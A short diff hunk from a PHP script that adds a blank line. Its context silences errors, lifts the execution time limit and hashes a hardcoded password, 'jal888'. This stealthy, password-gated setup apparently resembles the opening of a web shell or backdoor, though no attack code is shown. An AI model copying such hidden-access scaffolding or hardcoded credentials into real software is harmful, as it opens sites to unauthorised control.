@@ -6,6 +6,7 @@
 @ini_set('max_execution_time', 0);
 @ini_set('output_buffering', 0);
 @ini_set('display_errors', 0);
+
 session_start();
 
 $hashed_password = password_hash('jal888', PASSWORD_DEFAULT);
